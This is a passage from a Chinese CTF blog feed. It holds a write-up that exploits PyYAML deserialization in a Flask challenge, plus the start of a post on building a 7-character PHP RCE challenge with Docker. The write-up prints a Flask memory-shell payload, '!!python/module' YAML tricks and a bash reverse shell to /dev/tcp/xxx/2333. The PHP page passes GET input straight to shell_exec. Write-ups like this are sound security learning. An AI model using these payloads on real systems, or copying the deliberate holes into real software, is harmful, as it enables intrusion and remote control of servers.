class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    comment = Comment.query.<span class="built_in">filter</span>(Comment.blog_id == blog.<span class="built_in">id</span>)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;showBlog.html&quot;</span>, blog=blog, comment=comment)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/blogAll&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blogAll</span>():  </span><br><span class="line">    blogList = Blog.query.order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;blogAll.html&#x27;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/update/&lt;id&gt;&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;updateBlog.html&#x27;</span>, blog=blog)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&quot;id&quot;</span>)  </span><br><span class="line">        title = request.form.get(<span class="string">&quot;title&quot;</span>)  </span><br><span class="line">        text = request.form.get(<span class="string">&quot;text&quot;</span>)  </span><br><span class="line">        blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">        blog.title = title  </span><br><span class="line">        blog.text = text  </span><br><span class="line">        db.session.commit()  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;blogSuccess.html&#x27;</span>, title=title, <span class="built_in">id</span>=<span class="built_in">id</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/delete/&lt;id&gt;&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    blog = Blog.query.<span class="built_in">filter</span>(Blog.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(blog)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/myBlog&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myBlog</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    blogList = Blog.query.<span class="built_in">filter</span>(Blog.user_id == user.<span class="built_in">id</span>).order_by(Blog.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myBlog.html&quot;</span>, blogList=blogList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&quot;/comment&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comment</span>():  </span><br><span class="line">    text = request.values.get(<span class="string">&#x27;text&#x27;</span>)  </span><br><span class="line">    blogId = request.values.get(<span class="string">&#x27;blogId&#x27;</span>)  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    create_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    comment = Comment(text=text, create_time=create_time, blog_id=blogId, user_id=user.<span class="built_in">id</span>)  </span><br><span class="line">    db.session.add(comment)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;è¯„è®ºæˆåŠŸï¼&#x27;</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/myComment&#x27;</span></span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myComment</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">    commentList = Comment.query.<span class="built_in">filter</span>(Comment.user_id == user.<span class="built_in">id</span>).order_by(Comment.create_time.desc()).<span class="built_in">all</span>()  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;myComment.html&quot;</span>, commentList=commentList)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/deleteCom/&lt;id&gt;&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteCom</span>(<span class="params"><span class="built_in">id</span></span>):  </span><br><span class="line">    com = Comment.query.<span class="built_in">filter</span>(Comment.<span class="built_in">id</span> == <span class="built_in">id</span>).first()  </span><br><span class="line">    db.session.delete(com)  </span><br><span class="line">    db.session.commit()  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;state&#x27;</span>: <span class="literal">True</span>,  </span><br><span class="line">        <span class="string">&#x27;msg&#x27;</span>: <span class="string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹åˆ°blog.pyçš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è·¯ç”±</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)  </span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)  </span><br><span class="line">        file.save(filePath)  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ æˆåŠŸ!&#x27;</span>,  </span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath  </span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="keyword">return</span> &#123;  </span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,  </span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>  </span><br><span class="line">        &#125;  </span><br></pre></td></tr></table></figure><p><strong>yamlååºåˆ—åŒ–ç»•è¿‡</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                f = f.read()  </span><br><span class="line">                <span class="keyword">if</span> waf(f):  </span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šå½“ä½ çœ‹åˆ°è¿™å¥è¯æ—¶ï¼Œè¿˜æ²¡æœ‰æ‹¿åˆ°flagï¼Œé‚£å°±èµ¶ç´§é‡å¼€ç¯å¢ƒå§&#x27;</span>)  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼šä½ è¯´å¾—ä¸å¯¹&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;é²è¿…è¯´ï¼š&#x27;</span>+<span class="built_in">str</span>(e))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)  </span><br><span class="line">            saying = random.choice(sayings)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br></pre></td></tr></table></figure><p>æˆ‘ç¬¬ä¸€æ¬¡åšPYyamlååºåˆ—åŒ–ï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹</p><blockquote><p>yaml.dump()ï¼šå°†ä¸€ä¸ªPythonå¯¹è±¡åºåˆ—åŒ–ç”Ÿæˆä¸ºyamlæ–‡æ¡£ã€‚<br>yaml.load()ï¼šå°†ä¸€ä¸ªyamlæ–‡æ¡£ååºåˆ—åŒ–ä¸ºä¸€ä¸ªPythonå¯¹è±¡ã€‚<br><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š<br>Pythonä»£ç ä¸­æ˜¯å¦åŒ…å«â€œimport yamlâ€ï¼Œè‹¥åŒ…å«åˆ™è¿›ä¸€æ­¥æ’æŸ¥æ˜¯å¦è°ƒç”¨yaml.load()ä¸”å‚æ•°æ˜¯å¯æ§çš„ã€‚<br><strong>é˜²å¾¡æ–¹æ³•</strong><br>ä½¿ç”¨å®‰å…¨å‡½æ•°yaml.safe_load()æ›¿ä»£yaml.load()å³å¯è§£å†³Pyyamlååºåˆ—åŒ–æ¼æ´ã€‚</p></blockquote><p>ç„¶åæ˜¯åˆ©ç”¨yamlæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿™ä¸ªé¢˜pythonä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½ç»™banäº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åœ¨yamlè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡yamlæ¥å¯¼å…¥å…¶å®ƒæ¨¡å—æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>æœ¬é¢˜é€šè¿‡<strong>python&#x2F;module</strong>æ ‡ç­¾æ¥å®ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶å’Œæ‰§è¡Œçš„æ–‡ä»¶ä¸åœ¨åŒä¸€ç›®å½•ï¼Œé€šè¿‡å‡ºé¢˜äººçš„wpå¯çŸ¥ç›®å½•å±‚çº§ä¸º&#x2F;static&#x2F;upload&#x2F;ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå½“ç„¶é€šè¿‡å‰é¢çš„æµ‹è¯•ä¹Ÿå¯çŒœå‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™yamlæ–‡ä»¶å†…å®¹å°±å¯å†™æˆ<code>!!python/module:static.upload</code>ï¼Œä»è€ŒåŠ è½½å‘½ä»¤æ‰§è¡Œçš„æ¨¡å—ï¼Œè¿™æ ·å†™ä½ è¦åŠ è½½çš„æ¨¡å—æ–‡ä»¶åå¿…é¡»å‘½åä¸º<code>__init__.py</code>å¦åˆ™å°±è¦åœ¨yamlæ–‡ä»¶ä¸­å†™å…¥ä½ è¦åŠ è½½çš„æ¨¡å—æ–‡ä»¶å<br><strong>å…ˆæŠŠä¸Šé¢å…³äºmoduleæ ‡ç­¾åˆ©ç”¨è¿‡ç¨‹è§£é‡Šä¸€ä¸‹ï¼Œæ„Ÿè§‰é€»è¾‘æœ‰äº›æ··ä¹±äº†ï¼Œè‡ªå·±æ²¡å¤ªç†è§£</strong></p><blockquote><p>å‡å¦‚æœ‰ä¸ªyaml_test.pyæ–‡ä»¶ä¸º<br><code>import os </code><br><code>os.system(&#39;mate-calc&#39;)</code><br>åœ¨å¦ä¸€æ–‡ä»¶simple.pyä¸­ï¼Œä¾æ¬¡è¿è¡Œä»¥ä¸‹loadä»£ç <br><code>import yaml </code><br><code>yaml.load(&quot;!!python/module:yaml_test&quot; )  </code>#expæ–¹æ³•æ˜¯éšæ„å†™çš„ï¼Œæ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†å¿…é¡»è¦æœ‰ï¼Œå› ä¸ºè¿™æ˜¯å‘½åè§„åˆ™ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œä¸»è¦æ˜¯æ–‡ä»¶åyaml_testè¦å†™å¯¹<code>  </code>yaml.load(â€œ!!python&#x2F;object:yaml_test.expâ€ )<br><code>yaml.load(&quot;!!python/name:yaml_test.exp&quot; )</code><br>è¿™å‡ æ¡å‘½ä»¤éƒ½èƒ½æ‰“å¼€è®¡ç®—å™¨ï¼Œè¿™é‡Œæˆ‘è‡ªå·±æ²¡åšæµ‹è¯•ï¼Œyamlç‰ˆæœ¬å¤§äº5.1å°±è¦åŠ ä¸ªLoaderå‚æ•°å¦åˆ™æ‰§è¡Œyaml.loadå°±ä¼šæŠ¥é”™</p></blockquote><p>ä¸Šé¢æ˜¯è¦æ±‚åŒä¸€ç›®å½•ï¼Œä¸åœ¨åŒä¸€ç›®å½•å°±æ˜¯æœ¬é¢˜æ‰€ç”¨æ–¹æ³•ï¼Œç¨å¾®æ”¹ä¸€ä¸‹yamlæ–‡ä»¶æ–‡ä»¶å°±è¡Œï¼Œè¿™æ ·å°±æ¯”è¾ƒå¥½ç†è§£ä¸ºä»€ä¹ˆæ„é€ yamlæ–‡ä»¶å’Œ__init__.pyæ–‡ä»¶äº†<br>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ __init__.pyæ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå‡ºé¢˜äººè‡ªå·±çš„wpä½¿ç”¨çš„å†…å­˜é©¬æœ¬äººè¿˜æ²¡å¤ªäº†è§£æ‰€ä»¥ç›´æ¥ç”¨æ¥æ‰“ä¸€ä¸‹ï¼Œå°±ä¸è§£é‡Šæ„é€ äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="built_in">eval</span>(  </span><br><span class="line">    <span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;)).read())&quot;</span>,  </span><br><span class="line">   &#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>: url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>], <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)  </span><br><span class="line"><span class="comment"># ç”Ÿæˆä¸€ä¸ªshellè·¯ç”±ï¼Œå‚æ•°ä¸ºshell</span></span><br></pre></td></tr></table></figure><p>å…ˆå°†__init__.pyä¼ å…¥<br><img src="https://s1.ax1x.com/2022/12/27/zz0vcR.png" alt="zz0vcR.png"><br>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯å›¾ç‰‡ä¸Šä¼ è·¯ç”±åœ¨ä¸‹é¢è¿™é‡Œï¼ŒæŠ“æœ¬åœ°ä¸Šä¼ çš„é‚£ä¸ªåŒ…å°±è¡Œï¼Œå¾ˆå‚»çš„ä¸€ä¸ªé—®é¢˜è‡ªå·±åœ¨è¿™é‡Œå¡äº†åŠå¤©ï¼Œå¾—æ„Ÿè°¢ä¸€ä¸‹<a href="https://www.lengf233.top/">lengf</a>å¸ˆå‚…ç»™æˆ‘è§£ç­”è¿™ä¹ˆå‚»çš„é—®é¢˜<br><img src="https://s1.ax1x.com/2022/12/27/zz0xj1.png" alt="zz0xj1.png"><br>ç„¶åä¸Šä¼ yamlæ–‡ä»¶<br><img src="https://s1.ax1x.com/2022/12/27/zz0X9J.png" alt="zz0X9J.png"><br>æœ€åè®¿é—®<code>blog/saying?path=static/upload/poc1.yaml</code>ç”Ÿæˆè·¯ç”±ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><img src="https://s1.ax1x.com/2022/12/27/zz0Lh4.png" alt="zz0Lh4.png"><br>ç¬¬äºŒä¸ªæ˜¯åå¼¹shellï¼Œæˆ‘è¿™é‡Œç”¨çš„bashåå¼¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/2333 0&gt;&amp;1&quot;&#x27;)</span><br></pre></td></tr></table></figure><p>æ”¾å…¥__init__.pyç”Ÿæˆè·¯ç”±æ—¶ä¼šæ‰§è¡Œï¼Œå³å¯åå¼¹æˆåŠŸ<br><img src="https://s1.ax1x.com/2022/12/27/zz0j39.png" alt="zz0j39.png"><br>æœ‰æ—¶é—´å†æ²‰æ·€ä¸€ä¸‹ï¼Œç†è§£çš„ä¸æ˜¯å¾ˆé€å½»<br>å‚è€ƒï¼š<br><a href="https://pysnow.cn/archives/566/">å‡ºé¢˜äºº</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonmodule</a><br><a href="https://www.cnblogs.com/damoxilai/p/16707055.html">https://www.cnblogs.com/damoxilai/p/16707055.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7å­—ç¬¦rceé¢˜ç›®æ­å»º</title>
      <link href="/undefined/45179.html"/>
      <url>/undefined/45179.html</url>
      
        <content type="html"><![CDATA[<p><strong>æ­å»ºè¿™ä¸ªé¢˜ç›®æœ¬æ„å°±æ˜¯æƒ³å­¦ä¹ ä¸€ä¸‹dockerfileå’Œdocker-compose.ymlæ–‡ä»¶çš„ä½¿ç”¨ï¼ŒåŸç†è®²çš„ä¸é€å½»ï¼Œä¸»è¦è®°å½•ä¸€ä¸‹æ“ä½œ</strong></p><p>é¦–å…ˆåœ¨æœ¬åœ°æŠŠè§£é¢˜çš„æºç å†™å®Œï¼Œå†ä¸Šä¼ åˆ°æœåŠ¡å™¨<br><img src="https://s1.ax1x.com/2022/12/19/zLikCD.png" alt="zLikCD.png"><br>filesä¸‹æ”¾çš„æ˜¯flag.phpå’Œindex.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;=<span class="number">7</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>if(strlen($_GET[1])&lt;=7)</code>è¿™é‡Œæˆ‘ä¸€å¼€å§‹æµ‹è¯•ç”¨çš„å°äº8ï¼Œç„¶åè¿™é‡Œæ”¹äº†ä¹Ÿæ²¡å†æµ‹è¯•ï¼Œæ„æ€éƒ½ä¸€æ ·ï¼Œç„¶åç½‘ä¸Šè¿™é‡Œç”¨çš„å°äº7ï¼Œè¿™æ ·çš„è¯7å­—ç¬¦æ ¹æœ¬å°±è¿‡ä¸äº†<br>è¨€å½’æ­£ä¼ ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_73</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;JokerY&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Blog=<span class="string">&quot;https://joker2763.github.io/&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files  /var/www/html  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>FROMå°±æ˜¯æ‹‰å–ä¸€ä¸ªåŸºç¡€é•œåƒ<br>LABELå°±æ˜¯æ‰“æ ‡ç­¾ï¼Œè¯´æ˜ä½œè€…ç­‰<br><code>ENV LANG C.UTF-8</code>è¿™ä¸€å¥å°±æ˜¯ä½¿ç”¨utf-8ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç ï¼Œå½“ç„¶åœ¨è¿™ä¸ªé¢˜æ²¡æœ‰ä¸­æ–‡<br>COPYè¿™é‡Œå°±æ˜¯æŠŠæœåŠ¡å™¨çš„è§£é¢˜æ‰€éœ€æ–‡ä»¶æ”¾åˆ°dockerå®¹å™¨é‡Œé¢<br>EXPOSEæ˜¯æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£ï¼Œå°±æ˜¯æš´éœ²å®¹å™¨80ç«¯å£</p></blockquote><p>ç„¶åçœ‹ä¸€ä¸‹docker-compose.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;This_is_flag&#125;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span 